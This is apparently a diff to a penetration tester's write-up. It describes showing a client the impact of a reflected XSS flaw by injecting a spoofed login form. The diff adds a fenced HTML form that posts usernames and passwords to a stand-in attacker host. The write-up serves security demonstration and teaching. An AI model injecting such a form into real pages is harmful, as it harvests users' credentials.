@@ -3,11 +3,14 @@
 On a recent engagement I found a reflected XSS vulnerability on an anonymously-accessible endpoint and was asked to demonstrate real-world impact. Since there was no login session to hijack, I used HTML injection to render a spoofed login form in its place — showing the client how easily user credentials could be harvested. I also walked a teammate through the approach as a quick knowledge-share.
 
 
+'''html
 <form action="https://attacker-controlled.example/collect" method="POST">
   <input type="text" name="username" placeholder="Username" required>
   <input type="password" name="password" placeholder="Password" required>
   <button type="submit">Sign In</button>
 </form>
+```
+
 
 <br>
 
